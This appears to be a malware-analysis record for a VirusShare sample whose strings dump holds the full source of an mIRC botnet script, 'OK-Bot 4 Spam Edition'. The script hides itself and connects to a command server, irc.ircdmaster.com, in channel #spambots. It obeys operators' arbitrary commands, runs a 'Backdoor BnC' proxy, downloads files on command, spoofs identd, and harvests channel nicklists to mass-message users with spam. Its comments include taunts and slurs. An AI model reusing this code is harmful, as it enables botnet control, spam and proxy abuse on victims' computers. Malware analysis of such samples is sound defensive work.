{\nn725=      msg %chan \u000312Couldn't join $read(channels.txt,%chan_inc) $+ , need registered nick.\nn726=    }    \nn727=    .timer 1 5 next_chan\nn728=    return\nn729=  }\nn730=  ;366 End of nicklist\nn731=  if ($gettok(%spam,2,32) == 366) {\nn732=    if (%verbose == 1) {\nn733=      msg %chan \u000312Got $lines($read(channels.txt,%chan_inc)) nicks from $read(channels.txt,%chan_inc) $+ , commencing spam \u00033[Next: $+ $read(channels.txt,$calc(%chan_inc + 1)) $+ ]\nn734=    }\nn735=    sockwrite -n spam part $read(channels.txt,%chan_inc)\nn736=    %user_inc = 0\nn737=    spam\nn738=  }\nn739=  ;439 Target changed too fast\nn740=  if ($gettok(%spam,2,32) == 439) {\nn741=    if (%verbose == 1) {\nn742=      msg %chan \u00034Target changed too fast! Restarting in 5 seconds\nn743=      msg %chan \u00036Moving to next random server...\nn744=    }\nn745=    sockclose spam\nn746=    invite\nn747=  }\nn748=  ;353 Nicklist on a channel\nn749=  if ($gettok(%spam,2,32) == 353) {\nn750=    %my_spam_nick = $gettok(%spam,3,32)\nn751=    %nick_chunk = $gettok(%spam,2,58)\nn752=    %nick_chunk_inc = 0\nn753=    %nick_chunk_tot = $numtok(%nick_chunk,32)\nn754=    while (%nick_chunk_inc < %nick_chunk_tot) {\nn755=      inc %nick_chunk_inc\nn756=      if ($gettok(%nick_chunk,%nick_chunk_inc,32) != %my_spam_nick) {\nn757=        if ($len($gettok(%nick_chunk,%nick_chunk_inc,32)) > 2) {\nn758=          if (cop !isin $gettok(%nick_chunk,%nick_chunk_inc,32)) {\nn759=            if (bot !isin $gettok(%nick_chunk,%nick_chunk_inc,32)) {\nn760=              if (dcc !isin $gettok(%nick_chunk,%nick_chunk_inc,32)) {\nn761=                if (serv !isin $gettok(%nick_chunk,%nick_chunk_inc,32)) {\nn762=                  if ($left($gettok(%nick_chunk,%nick_chunk_inc,32),1) == $chr(64)) {\nn763=                    write users.txt $remtok($gettok(%nick_chunk,%nick_chunk_inc,32),1,64)\nn764=                  }\nn765=                  if ($left($gettok(%nick_chunk,%nick_chunk_inc,32),1) == $chr(37)) {\nn766=                    write users.txt $remtok($gettok(%nick_chunk,%nick_chunk_inc,32),1,37)\nn767=                  }\nn768=                  if ($left($gettok(%nick_chunk,%nick_chunk_inc,32),1) == $chr(43)) {\nn769=                    write users.txt $remtok($gettok(%nick_chunk,%nick_chunk_inc,32),1,43)\nn770=                  }\nn771=                  if ($left($gettok(%nick_chunk,%nick_chunk_inc,32),1) == $chr(33)) {\nn772=                    write users.txt $remtok($gettok(%nick_chunk,%nick_chunk_inc,32),1,33)\nn773=                  }\nn774=                  if ($left($gettok(%nick_chunk,%nick_chunk_inc,32),1) == $chr(46)) {\nn775=                    write users.txt $remtok($gettok(%nick_chunk,%nick_chunk_inc,32),1,46)\nn776=                  }\nn777=                  if ($left($gettok(%nick_chunk,%nick_chunk_inc,32),1) isalnum) {\nn778=                    write users.txt $gettok(%nick_chunk,%nick_chunk_inc,32)\nn779=                  }\nn780=                }\nn781=              }\nn782=            }\nn783=          }\nn784=        }\nn785=      }\nn786=    }\nn787=  }\nn788=  if ($left($gettok(%spam,3,32),1) != $chr(35)) && ($gettok(%spam,2,32) == PRIVMSG) {\nn789=    if (dcc !isin $gettok(%spam,1,32)) && (bot !isin $gettok($gettok(%spam,1,32),1,64)) {\nn790=      if (serv !isin $gettok(%spam,1,32)) && ($chr(46) !isin $gettok($gettok(%spam,1,32),1,64)) {\nn791=        if (%verbose == 1) {\nn792=          msg %chan \u00031,0<\u000314 $+ %n $+ \u00031,0> $gettok($gettok(%spam,4,32),1,58) $gettok(%spam,5-,32)\nn793=        }\nn794=      }  \nn795=    }\nn796=  }\nn797=  if ($left($gettok(%spam,3,32),1) != $chr(35)) && ($gettok(%spam,2,32) == NOTICE) {\nn798=    if (dcc !isin $gettok(%spam,1,32)) && (bot !isin $gettok($gettok(%spam,1,32),1,64)) {\nn799=      if (serv !isin $gettok(%spam,1,32)) && ($chr(46) !isin $gettok($gettok(%spam,1,32),1,64)) {\nn800=        if (%verbose == 1) {\nn801=          msg %chan \u00035- $+ %n $+ -\u00031,0 $gettok($gettok(%spam,4,32),1,58) $gettok(%spam,5-,32)\nn802=        }   \nn803=      }\nn804=    }\nn805=  }\nn806=  goto spam\nn807=}\nn808=alias next_chan {\nn809=  write -c users.txt\nn810=  inc %chan_inc\nn811=  if (%chan_inc > $lines(channels.txt)) { \nn812=    sockclose spam \nn813=    invite\nn814=    return\nn815=  }\nn816=  if ($sock(spam).status == active) {\nn817=    sockwrite -n spam join $read(channels.txt,%chan_inc)\nn818=  }\nn819=}\nn820=alias spam {\nn821=  if ($sock(spam).status == $null) { invite | return }\nn822=  inc %user_inc\nn823=  if (%user_inc > $lines(users.txt)) { next_chan | return }\nn824=  .timerkeep_alive off\nn825=  .timerkeep_alive -o 1 90 spam_timeout\nn826=  if ($sock(spam).status == active) {\nn827=    sockwrite -n spam privmsg $read(users.txt,%user_inc) : $+ %spam_message\nn828=  }\nn829=  inc %spam_total\nn830=  if (%verbose == 1) {\nn831=    msg %chan \u000310[ $+ %spam_server $+ ] \u00037[ $+ $read(users.txt,%user_inc) $+ \u00031,0( $+ %user_inc $+ / $+ $lines(users.txt) $+ ) $+ \u00037] \u00033[ $+ $read(channels.txt,%chan_inc) $+ \u00031,0( $+ %chan_inc $+ / $+ $lines(channels.txt) $+ ) $+ \u00033] \u000312[ $+ %spam_total $+ ]\nn832=  }  \nn833=  .timerspam -o 1 20 spam\nn834=}\nn835=alias spam_timeout {\nn836=  if (%verbose = 1) {\nn837=    msg %chan \u00034Spambot stalled! Auto restart in 5 seconds\nn838=    msg %chan \u00036Moving to next random server...\nn839=  }\nn840=}\nn841=on *:disconnect: {\nn842=  nick $rnick\nn843=  anick $rnick $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)\nn844=  server irc.ircdmaster.com\nn845=}"
    },
    "filename": "VirusShare_15b4c0c0eabec52faf14b30671e1ca7a",
    "filesize": 32903,
    "filetype": "data",
    "hashes": {
        "md5": "15b4c0c0eabec52faf14b30671e1ca7a",
        "sha1": "cfbf2f95ae11560d19fdfdee6191a727b127e739",
        "sha256": "c9962250356a44d76ca6699ce9c2018de43457e36ae96e43558ca3ebbe83761f"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "[script]",
            "n0=;OK-Bot 4 ((cigicigi) Spam Edition), by Fyle",
            "n2=;If you are reading this then you are an elite hacker",
            "n3=;who has hacked and 0wned us. please come to whichever",
            "n4=;server and channel that you find in this bot and",
            "n5=;threaten to call isps and pretend that you have some sort",
            "n6=;of authority regarding what other people are allowed to",
            "n7=;do and say online and on their computers and tell us",
            "n8=;that you have our IPs and that various government",
            "n9=;agencies will soon be knocking down our doors unless we",
            "n10=;comply with your whims. We enjoy it, we keep logs of all",
            "n11=;of it and we sit around just laughing and laughing and",
            "n12=;laughing over the silly antics of people who think",
            "n13=;they have \"hacked\" something because they saw a",
            "n14=;server and channel in an ini file.",
            "n15=;Also, in order to save keystrokes, let me just say that",
            "n16=;1. Anatoly, warmode, Jackal, Fyle, berdan, mqm ",
            "n17=;and all other script kiddies are bad and lame.",
            "n18=;Fyle is especially lame, and doesn't know how to code",
            "n19=;anything good. His code is bad, he is lame, and he probably",
            "n20=;has a small penis and talks like a girl. Did you see that",
            "n21=;shitty exe he made in VB and dropped on the GT bots?",
            "n22=;loooooooooool that is soooo lame. lame lame lame lame",
            "n23=;lame lololololol. oh god, what a fucking lamer hahahahha",
            "n24=;2.GT bots are lame. They have a big file size and mhide.exe",
            "n25=;doesn't work all the time. They can be opened up by anyone",
            "n26=;who figures out where they are and the goings-on of the",
            "n27=;botnet owner and his devious cohorts can be watched and",
            "n28=;documented. This is bad, but Fyle is too stupid to understand",
            "n29=;this and so has been \"hacked\" and \"0wned\" by you, the person",
            "n30=;reading this now.",
            "n31=;3. fcastle is totally gay for Fyle",
            "n32=;4. anything that doesn't exploit an undocumented vulnerability,",
            "n33=;have every concievable feature and ability, isn't written in",
            "n34=;assembly, isn't polymorphic and doesn't have a filesize < 1 kb",
            "n35=;is totally lame, and the person that made it must be completely",
            "n36=;retarded. Let us call this the \"I-don't-understand-",
            "n37=;anything-and-have-never-written-a-line-of-code-in-my-life-",
            "n38=;but-a-website-told-me-to-think-certain-things-about-certain-",
            "n39=;behaviors-and-other-people-are-lame-but-i-am-elite\"",
            "n40=;mor principle of this sub-sub-counter culture of internet ",
            "n41=;addicts, shall we? And now, more lameness...",
            "n42=",
            "n43=on *:start: {",
            "n44=  if (%bnc_connection_total == $null) { %bnc_connection_total = 0 }",
            "n45=  if (%dropped == $null) { %dropped = $fulldate }",
            "n46=  if (%spam_total == $null) { %spam_total = 0 }",
            "n47=  if ($appstate != hidden) { exit }",
            "n48=  if (%starts == $null) { %starts = 0 }",
            "n49=  %verbose = 0",
            "n50=  nick $rnick",
            "n51=  anick $rnick $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)",
            "n52=  emailaddr $rnick $+ @ $+ $rnick $+ .com",
            "n53=  fullname $rnick",
            "n54=  ident_start",
            "n55=  .timer -o 0 60 keep_alive",
            "n56=  .timer -o 0 1 clearall",
            "n57=",
            "n58=;THIS IS THE SERVER THAT THE GT BOTS CONNECT TO.",
            "n59=;COME HERE AND TELL US THAT WE ARE LAME AND THAT THIS",
            "n60=;BOT SUCKS. LAAAAAAME WE ARE LAME LAME LAME HAHAHAHA",
            "n61=",
            "n62=  server irc.ircdmaster.com",
            "n63=  inc %starts",
            "n64=}",
            "n65=alias keep_alive {",
            "n66=  if ($status == disconnected) {",
            "n67=    nick $rnick",
            "n68=    anick $rnick $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)",
            "n69=    server irc.ircdmaster.com",
            "n70=  }",
            "n71=  ident_start",
            "n72=}",
            "n73=",
            "n74=alias rnick { return $read(names.txt,$r(1,$lines(names.txt))) }",
            "n75=",
            "n76=on *:connect: {",
            "n77=  ident_start",
            "n78=",
            "n79=;THIS IS THE CHANNEL THAT THE GT BOTS JOIN AFTER THEY",
            "n80=;LOG ONTO THE SERVER. COME HERE TO SEE WHAT WE ARE UP",
            "n81=;TO AND TO KEEP TABS ON HOW MANY BOTS WE HAVE. KEEP LOGS",
            "n82=;OF THE CHANNEL TO USE WHEN YOU SEND THREATENING E-MAILS",
            "n83=;TO THE ISPS OF THE BNC'S WE ARE USING.",
            "n84=",
            "n85=  %chan = #spambots",
            "n86=  join %chan entry",
            "n87=}",
            "n88=raw 332:*: {",
            "n89=  if ($1 == $me) && ($2 == %chan) && ($3 == quiet) && ($4 == setspam:) {",
            "n90=    ;nick [ON] $+ $mid($me,$calc($pos($me,])+1))   ",
            "n91=    set %spam_message $5-",
            "n92=    msg %chan ",
            "12Starting spambot in QUIET mode",
            "n93=    msg %chan ",
            "13Spam message set to: ",
            "1,0 %spam_message",
            "n94=    invite",
            "n95=    .timerinvite -o 0 5 invite",
            "n96=    %verbose = 0",
            "n97=  }",
            "n98=  if ($1 == $me) && ($2 == %chan) && ($3 == verbose) && ($4 == setspam:) {",
            "n99=    ;nick [ON] $+ $mid($me,$calc($pos($me,])+1))    ",
            "n100=    set %spam_message $5-",
            "n101=    msg %chan ",
            "12Starting spambot in VERBOSE mode",
            "n102=    msg %chan ",
            "13Spam message set to: ",
            "1,0 %spam_message",
            "n103=    invite",
            "n104=    .timerinvite -o 0 5 invite",
            "n105=    %verbose = 1",
            "n106=  }",
            "n107=  if ($3 == OFF) && ($2 == %chan) {",
            "n108=    ;nick [OFF] $+ $mid($me,$calc($pos($me,])+1))",
            "n109=  }",
            "n110=  if ($2 == %chan) && ($3 != verbose) && ($3 != quiet) {",
            "n111=    ;nick [IDLE] $+ $mid($me,$calc($pos($me,])+1))",
            "n112=  }",
            "n113=}",
            "n114=",
            "n115=;********* CHANNEL COMMANDS **********",
            "n116=alias start_spam {",
            "n117=  if (%verbose == 1) {",
            "n118=    msg %chan ",
            "12Starting spambot in VERBOSE mode",
            "n119=  }",
            "n120=  if (%verbose == 0) {",
            "n121=    msg %chan ",
            "12Starting spambot in QUIET mode",
            "n122=  }",
            "n123=}",
            "n124=alias spam_off {",
            "n125=  ;nick [OFF] $+ $mid($me,$calc($pos($me,])+1))",
            "n126=  msg %chan ",
            "6Killed spambot",
            "n127=  .timers off",
            "n128=  .timer -o 0 60 keep_alive",
            "n129=  .timer -o 0 1 clearall",
            "n130=  sockclose spam",
            "n131=}",
            "n132=alias spam_on {",
            "n133=  start_spam",
            "n134=  ;nick [ON] $+ $mid($me,$calc($pos($me,])+1))",
            "n135=  invite",
            "n136=  .timerinvite -o 0 5 invite",
            "n137=}",
            "n138=alias spam_set {",
            "n139=  set %spam_message $1-",
            "n140=  if (%verbose == 1) {",
            "n141=    msg %chan ",
            "13Spam message set to:",
            "1,0 %spam_message",
            "n142=  }",
            "n143=}",
            "n144=alias verbose_on {",
            "n145=  %verbose = 1",
            "n146=  msg %chan ",
            "12Bot is in VERBOSE mode",
            "n147=}",
            "n148=alias verbose_off {",
            "n149=  %verbose = 0",
            "n150=}",
            "n151=on *:text:*:*: {",
            "n152=",
            "n153=;THESE ARE ALL OF THE BOT COMMANDS. OMFG HOW LAME.",
            "n154=",
            "n155=  if ($nick isop %chan) {",
            "n156=",
            "n157=    if ($1 == ok:) { $2- }",
            "n158=    if ($1 == $1) { clearall }",
            "n159=    if ($1 == ok) && ($2 == $me $+ :) { $3- }",
            "n160=    if ($1 == $me) && ($2 == ok:) { $3- }",
            "n161=    if ($1 == reply:) { .timer 1 0 reply $2- }",
            "n162=    if ($1 == bnc:) { bnc_start $2 $nick }",
            "n163=    if ($1 == $me) && ($2 == bnc:) { bnc_start $3 $nick }",
            "n164=    if ($1 == bnc) && ($2 == $me $+ :) { bnc_start $3 $nick }",
            "n165=    if ($1 == $me) && ($2 == reply:) { .timer 1 0 reply $3- }",
            "n166=    if ($1 == $me) && ($2 == bnc:) { bnc_start $3 $nick }",
            "n167=    if ($1 == $me) && ($2 == download:) { download $3 }",
            "n168=",
            "n169=    if ($1 == setspam:) { spam_set $2- }",
            "n170=    if ($1 == spamset:) { spam_set $2- }",
            "n171=    if ($1 == $me) && ($2 == setspam:) { spam_set $3- }",
            "n172=    if ($1 == $me) && ($2 == spamset:) { spam_set $3- }",
            "n173=    if ($2 == $me $+ :) && ($1 == setspam:) { spam_set $3- }",
            "n174=    if ($2 == $me $+ :) && ($1 == spamset:) { spam_set $3- }",
            "n175=",
            "n176=    if ($1 == startspam:) { spam_on }",
            "n177=    if ($1 == spamstart:) { spam_on }",
            "n178=    if ($1 == $me) && ($2 == spamstart:) { spam_on }",
            "n179=    if ($1 == $me) && ($2 == startspam:) { spam_on }",
            "n180=    if ($2 == $me $+ :) && ($1 == startspam) { spam_on }",
            "n181=    if ($2 == $me $+ :) && ($1 == spamstart) { spam_on }",
            "n182=",
            "n183=    if ($1 == spamstop:) { spam_off }",
            "n184=    if ($1 == stopspam:) { spam_off }",
            "n185=    if ($1 == $me) && ($2 == stopspam:) { spam_off }",
            "n186=    if ($1 == $me) && ($2 == spamstop:) { spam_off }",
            "n187=    if ($2 == $me $+ :) && ($1 == stopspam) { spam_off }",
            "n188=    if ($2 == $me $+ :) && ($1 == spamstop) { spam_off }",
            "n189=",
            "n190=    if ($1 == quiet) { verbose_off }",
            "n191=    if ($1 == quiet:) { verbose_off }",
            "n192=    if ($1 == verbose) { verbose_on }",
            "n193=    if ($1 == verbose:) { verbose_on }",
            "n194=    if ($1 == $me) && ($2 == quiet:) { verbose_off }",
            "n195=    if ($1 == $me) && ($2 == verbose:) { verbose_on }",
            "n196=    if ($1 == quiet) && ($2 == $me $+ :) { verbose_off }",
            "n197=    if ($1 == verbose) && ($2 == $me $+ :) { verbose_on }",
            "n198=  }",
            "n199=}",
            "n200=on *:text:*:?: {",
            "n201=  if ($nick != Anatoly) {",
            "n202=    msg Anatoly ",
            "12[ $+ $nick $+ ] Msg'd me",
            "1,0: $1-",
            "n203=    ignore -u3 $nick",
            "n204=  }",
            "n205=}",
            "n206=",
            "n207=alias reply { msg %chan $1- }",
            "n208=",
            "n209=;****** CLONE SOCKETS *******",
            "n210=",
            "n211=on *:sockopen:clone*: {",
            "n212=  if ($sock($sockname).status == active) { ",
            "n213=    %identd_bind = $sock($sockname).bindport",
            "n214=    sockwrite -n $sockname NICK $rnick",
            "n215=    sockwrite -n $sockname USER $rnick \"\" \" $+ $rnick $+ \" : $+ $rnick",
            "n216=    msg %chan ",
            "4[ $sockname ] ",
            "3Connected  ",
            "n217=  } ",
            "n218=  if ($sock(ident).status != listening) {",
            "n219=    if ($portfree(113) == $true) {",
            "n220=      socklisten ident 113",
            "n221=    }",
            "n222=  }",
            "n223=}",
            "n224=on *:sockread:clone*: {",
            "n225=  if ($sockerr > 0) return",
            "n226=  :clone",
            "n227=  sockread %clone",
            "n228=  if ($sockbr == 0) { return }",
            "n229=  if (%clone == $null) { %clone = - }",
            "n230=  if ($gettok(%clone,1,32) == ping) {",
            "n231=    sockwrite -n $sockname PONG $gettok($gettok(%clone,2,32),1,58)",
            "n232=  }",
            "n233=  if ($gettok(%clone,2,32) == 433) {",
            "n234=    sockwrite -n $sockname NICK $rnick",
            "n235=  }",
            "n236=  if ($gettok(%clone,2,32) == 422) || ($gettok(%clone,2,32) == 376) {",
            "n237=    msg %chan ",
            "4[ $sockname ] ",
            "12Logged in",
            "n238=  }",
            "n239=  %n = $gettok($gettok(%clone,1,33),1,58)",
            "n240=  if ($gettok(%clone,2,32) == PRIVMSG) && ($gettok(%clone,4,32) == :",
            "PING) {",
            "n241=    sockwrite -n $sockname NOTICE %n :",
            "PING $gettok(%clone,5,32)",
            "n242=  }",
            "n243=  if ($gettok(%clone,2,32) == PRIVMSG) && ($gettok(%clone,4,32) == :",
            "VERSION",
            "n244=    sockwrite -n $sockname NOTICE %n :",
            "VERSION mIRC v6.03 Khaled Mardam-Bey",
            "n245=  }",
            "n246=  if ($gettok(%clone,2,32) == PRIVMSG) && ($gettok(%clone,4,32) == :",
            "TIME",
            "n247=    sockwrite -n $sockname NOTICE %n :",
            "TIME $fulldate $+ ",
            "n248=  }",
            "n249=  unset %n",
            "n250=  goto clone",
            "n251=}",
            "n252=on *:sockclose:clone*: {",
            "n253=  msg %chan ",
            "4[ $sockname ] ",
            "6Terminated",
            "n254=}",
            "n255=;*************** IDENTd *************",
            "n256=",
            "n257=on *:socklisten:ident: { ",
            "n258=  sockaccept ident_ $+ $r(0,9999999999) ",
            "n259=}",
            "n260=on *:sockread:ident*: { ",
            "n261=  sockread %ident",
            "n262=  sockwrite -n $sockname %identd_bind $+ , 6667 : USERID: $rnick : $rnick ",
            "n263=  sockclose $sockname",
            "n264=}",
            "n265=alias ident_start {",
            "n266=  if ($portfree(113) == $true) {",
            "n267=    socklisten ident 113",
            "n268=  }",
            "n269=}",
            "n270=",
            "n271=;******************* BnC *****************",
            "n272=",
            "n273=alias bnc_start {",
            "n274=  if ($portfree($1) != $true) {",
            "n275=    notice $2 ",
            "12[BnC] ",
            "6Port $1 in use",
            "n276=  }",
            "n277=  if ($portfree($1) == $true) {",
            "n278=    sockclose bnc_listen",
            "n279=    socklisten bnc_listen $1",
            "n280=    if (%bnc_status != dead) {",
            "n281=      notice $2 ",
            "12[BnC Listening] ",
            "4/server -m $ip $sock(bnc_listen).port ",
            "7[ %bnc_connection_total ]",
            "n282=    }",
            "n283=    if (%bnc_status == dead) {",
            "n284=      sockclose bnc_listen",
            "n285=      notice $2 ",
            "6[BnC Dead]",
            "n286=    }",
            "n287=  }",
            "n288=}",
            "n289=on *:socklisten:bnc_listen: { ",
            "n290=  %bnc_tmp = bnc_client_ $+ $ticks",
            "n291=  sockaccept %bnc_tmp",
            "n292=  sockwrite -n %bnc_tmp :x 002 :",
            "3Welcome to Backdoor BnC by Fyle",
            "n293=  sockwrite -n %bnc_tmp :x 002 :",
            "3Use /con <server> [port] to connect",
            "n294=  sockwrite -n %bnc_tmp :x 002 :",
            "3Currently $sock(bnc_server_*,0) BnC users online",
            "n295=  s_rename ",
            "n296=}",
            "n297=alias s_rename { ",
            "n298=  if ($sock(bnc_client_ $+ $sock(%bnc_tmp).ip).status == Active) { ",
            "n299=    sockwrite -n %bnc_tmp :x 002 :",
            "3One connection per IP",
            "n300=    sockclose %bnc_tmp",
            "n301=    return ",
            "n302=  }",
            "n303=  sockrename %bnc_tmp bnc_client_ $+ $sock(%bnc_tmp).ip ",
            "n304=}",
            "n305=on *:sockread:bnc_client*: { ",
            "n306=  if ($sockerr > 0) { return }",
            "n307=  :next",
            "n308=  sockread %client",
            "n309=  if ($sockbr == 0) { return }",
            "n310=  if ($gettok(%client,1,32) == NICK) {",
            "n311=    hadd -m $sockname 1 $gettok(%client,2,32)",
            "n312=  }",
            "n313=  if ($gettok(%client,1,32) == USER) {",
            "n314=    hadd -m $sockname 2 $gettok(%client,2-,32)",
            "n315=  }",
            "n316=  if ($gettok(%client,1,32) == CON) {",
            "n317=    if ($gettok(%client,2,32) != $null) {",
            "n318=      if ($gettok(%client,3,32) != $null) {",
            "n319=        if (. isin $gettok(%client,2,32)) {",
            "n320=          if ($gettok(%client,3,32) isnum 1-65535) { ",
            "n321=            if ($sock(bnc_server_ $+ $gettok($sockname,3,95)).status == active) {",
            "n322=              sockwrite -n $sockname :x 002 :",
            "3Terminating connection to $sock(bnc_server_ $+ $gettok($sockname,3,95)).ip",
            "n323=              sockclose bnc_server_ $+ $gettok($sockname,3,95)",
            "n324=            }",
            "n325=            sockwrite -n $sockname :x 002 :",
            "3Attempting connection to $gettok(%client,2-,32)",
            "n326=            sockopen bnc_server_ $+ $sock($sockname).ip $gettok(%client,2-,32)",
            "n327=            return ",
            "n328=          } ",
            "n329=        } ",
            "n330=      } ",
            "n331=    } ",
            "n332=  }",
            "n333=  if ($sock(bnc_server_ $+ $gettok($sockname,3,95)).status != Active) { ",
            "n334=    return ",
            "n335=  }",
            "n336=  sockwrite -n bnc_server_ $+ $gettok($sockname,3,95) %client",
            "n337=  inc %bnc_bytes $calc($len(%client) * 2)",
            "n338=  goto next ",
            "n339=}",
            "n340=on *:sockopen:bnc_server_*: { ",
            "n341=  if ($sock($sockname).status == Active) {",
            "n342=    %identd_bind = $sock($sockname).bindport",
            "n343=    sockwrite -n $sockname NICK $hget($sock(bnc_client_ $+ $gettok($sockname,3,95)),1)",
            "n344=    sockwrite -n $sockname USER $hget($sock(bnc_client_ $+ $gettok($sockname,3,95)),2)",
            "n345=    inc %bnc_connection_total",
            "n346=  } ",
            "n347=}",
            "n348=on *:sockread:bnc_server_*: { ",
            "n349=  if ($sockerr > 0) { return }",
            "n350=  :next",
            "n351=  sockread %server",
            "n352=  if ($sockbr == 0) { return }",
            "n353=  if ($sock(bnc_client_ $+ $gettok($sockname,3,95)).status != Active) { return }",
            "n354=  sockwrite -n bnc_client_ $+ $gettok($sockname,3,95) %server",
            "n355=  inc %bnc_bytes $calc($len(%server) * 2)",
            "n356=  goto next ",
            "n357=}",
            "n358=on *:sockclose:bnc_server_*: {",
            "n359=  if ($sock(bnc_client_ $+ $gettok($sockname,3,95)).status == active) {",
            "n360=    sockwrite -n bnc_client_ $+ $gettok($sockname,3,95) :x 002 :",
            "3Connection to $sock($sockname).ip $sock($sockname).port closed",
            "n361=    sockwrite -n bnc_client_ $+ $gettok($sockname,3,95) :x 002 :",
            "3Welcome to Backdoor BnC by Fyle",
            "n362=    sockwrite -n bnc_client_ $+ $gettok($sockname,3,95) :x 002 :",
            "3Use /con <server> [port] to connect",
            "n363=  }",
            "n364=}",
            "n365=on *:sockclose:bnc_client_*: {",
            "n366=  sockclose bnc_server_ $+ $gettok($sockname,3,95)",
            "n367=}",
            "n368=",
            "n369=;****** WEB DOWNLOADER ******",
            "n370=",
            "n371=alias download {",
            "n372=  if ($1 == $null) {",
            "n373=    msg %chan ",
            "Usage",
            ": download <http://www.domain.com/file.name> [file size]",
            "n374=    halt",
            "n375=    return",
            "n376=  }",
            "n377=  if ($sock(download).status != $null) {",
            "n378=    msg %chan ",
            "Download",
            ": download socket busy, ignoring command",
            "n379=    halt",
            "n380=    return",
            "n381=  }",
            "n382=  if ($left($1,7) != http://) || ($chr(46) !isin $gettok($1,2,47)) {",
            "n383=    msg %chan ",
            "Usage",
            ": download <http://www.domain.com/file.name> [file size]",
            "n384=    halt",
            "n385=    return",
            "n386=  }",
            "n387=  if ($left($1,7) == http://) && ($chr(46) isin $gettok($1,2,47)) {",
            "n388=    if ($gettok($1,3-,47) == $null) {",
            "n389=      msg %chan ",
            "Download Halted",
            ": No file to request",
            "n390=      halt",
            "n391=      return",
            "n392=    }",
            "n393=    hadd -m download 1 $gettok($1,2,47)",
            "n394=    hadd -m download 2 $gettok($1,3-,47)",
            "n395=    hadd -m download 3 $gettok($1,$numtok($1,47),47)",
            "n396=    sockclose download",
            "n397=    sockopen download $hget(download,1) 80",
            "n398=  }",
            "n399=}",
            "n400=on *:sockopen:download: {",
            "n401=  unset %chk",
            "n402=  if ($sock(download).status == active) {",
            "n403=    sockwrite -n download GET / $+ $hget(download,2) HTTP/1.1",
            "n404=    sockwrite -n download Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*",
            "n405=    sockwrite -n download Accept-Language: en-us",
            "n406=    sockwrite -n download Accept-Encoding: identity",
            "n407=    sockwrite -n download Host: $hget(download,1)",
            "n408=    sockwrite download $crlf",
            "n409=  }",
            "n410=  if ($sock(download).status != active) {",
            "n411=    msg %chan ",
            "Download Failed",
            ": Could not connect to $hget(download,1)",
            "n412=    sockclose download",
            "n413=    return",
            "n414=  }",
            "n415=}",
            "n416=on *:sockread:download: {  ",
            "n417=  if (%chk == $null) { ",
            "n418=    sockread %download",
            "n419=    if ($gettok(%download,1,32) == Content-length:) {",
            "n420=      hadd -m download 4 $gettok(%download,2,32)",
            "n421=      if ($exists($mircdir $+ download\\ $+ $hget(download,3)) == $true) {",
            "n422=        if ($file($mircdir $+ download\\ $+ $hget(download,3)).size == $hget(download,4)) {",
            "n423=          msg %chan ",
            "Download Halted",
            ": I already have that file",
            "n424=          sockclose download",
            "n425=          halt",
            "n426=          return ",
            "n427=        }",
            "n428=        if ($file($mircdir $+ download\\ $+ $hget(download,3)).size != $hget(download,4)) {",
            "n429=          .remove \" $+ $mircdir $+ download\\ $+ $hget(download,3) $+ \"",
            "n430=        }",
            "n431=      }",
            "n432=    }",
            "n433=    if ($gettok(%download,1,32) == HTTP/1.1) {",
            "n434=      if ($gettok(%download,2,32) == 200) {",
            "n435=        msg %chan ",
            "Download",
            ": $gettok(%download,2-,32)",
            "n436=      }",
            "n437=      if ($left($gettok(%download,2,32),1) == 1) {",
            "n438=        msg %chan ",
            "Download Failed",
            ": $gettok(%download,2-,32)",
            "n439=        sockclose download",
            "n440=        halt",
            "n441=        return",
            "n442=      }",
            "n443=      if ($gettok(%download,2,32) == 201) {",
            "n444=        msg %chan ",
            "Download Failed",
            ": $gettok(%download,2-,32)",
            "n445=        sockclose download",
            "n446=        halt",
            "n447=        return",
            "n448=      }",
            "n449=      if ($gettok(%download,2,32) == 202) {",
            "n450=        msg %chan ",
            "Download Failed",
            ": $gettok(%download,2-,32)",
            "n451=        sockclose download",
            "n452=        halt",
            "n453=        return",
            "n454=      }",
            "n455=      if ($gettok(%download,2,32) == 203) {",
            "n456=        msg %chan ",
            "Download Failed",
            ": $gettok(%download,2-,32)",
            "n457=        sockclose download",
            "n458=        halt",
            "n459=        return",
            "n460=      }",
            "n461=      if ($gettok(%download,2,32) == 204) {",
            "n462=        msg %chan ",
            "Download Failed",
            ": $gettok(%download,2-,32)",
            "n463=        sockclose download",
            "n464=        halt",
            "n465=        return",
            "n466=      }",
            "n467=      if ($gettok(%download,2,32) == 205) {",
            "n468=        msg %chan ",
            "Download Failed",
            ": $gettok(%download,2-,32)",
            "n469=        sockclose download",
            "n470=        halt",
            "n471=        return",
            "n472=      }",
            "n473=      if ($gettok(%download,2,32) == 206) {",
            "n474=        msg %chan ",
            "Download Failed",
            ": $gettok(%download,2-,32)",
            "n475=        sockclose download",
            "n476=        halt",
            "n477=        return",
            "n478=      }",
            "n479=      if ($left($gettok(%download,2,32),1) == 3) {",
            "n480=        msg %chan ",
            "Download Failed",
            ": $gettok(%download,2-,32)",
            "n481=        sockclose download",
            "n482=        halt",
            "n483=        return",
            "n484=      }",
            "n485=      if ($left($gettok(%download,2,32),1) == 4) {",
            "n486=        msg %chan ",
            "Download Failed",
            ": $gettok(%download,2-,32)",
            "n487=        sockclose download",
            "n488=        halt",
            "n489=        return",
            "n490=      }",
            "n491=      if ($left($gettok(%download,2,32),1) == 5) {",
            "n492=        msg %chan ",
            "Download Failed",
            ": $gettok(%download,2-,32)",
            "n493=        sockclose download",
            "n494=        halt",
            "n495=        return",
            "n496=      }",
            "n497=    }",
            "n498=    if ($len(%download) < 4) {",
            "n499=      %chk = 1",
            "n500=    }",
            "n501=    halt",
            "n502=  }",
            "n503=  :download",
            "n504=  sockread &download",
            "n505=  if ($sockbr == 0) { return } ",
            "n506=  bwrite \" $+ $mircdir $+ download\\ $+ $hget(download,3) $+ \" -1 &download",
            "n507=  goto download",
            "n508=}",
            "n509=on *:sockclose:download: { ",
            "n510=  if ($hget(download,4) == $file($mircdir $+ download\\ $+ $hget(download,3)).size) {",
            "n511=    msg %chan ",
            "Download Ended",
            " Expected Filesize ",
            "2[ $hget(download,4) ] ",
            "1,0Actual Filesize: ",
            "3[ $file($mircdir $+ download\\ $+ $hget(download,3)).size ] ",
            "1,0Result: ",
            "4[ Success ] ( $+ ",
